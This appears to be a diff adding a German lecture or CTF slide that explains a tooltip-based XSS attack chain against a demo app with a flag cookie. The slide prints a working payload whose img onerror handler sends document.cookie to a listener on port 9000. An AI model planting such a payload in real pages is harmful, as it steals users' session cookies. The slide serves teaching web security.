@@ -1,0 +1,11 @@
+\frametitle{Angriffskette}
+\begin{enumerate}
+    \item \textbf{Daten:} Geheimnis in \texttt{session\_token}-Cookie (\texttt{websec\{1337\}})
+    \item \textbf{Waffen:} Payload im \texttt{title}-Attribut des Buttons (Tooltip-HTML)
+    \item \textbf{Trigger:} Opfer \textbf{hovert} über „Upload Photo“ $\rightarrow$ Tooltip rendert Payload
+    \item \textbf{Exfil:} \texttt{onerror} auf \texttt{<img src=x>} sendet Cookie an Port~9000
+  \end{enumerate}
+  \begin{verbatim}
+<img src=x onerror="fetch('http://127.0.0.1:9000/?loot='+
+  encodeURIComponent(document.cookie))">
+  \end{verbatim}
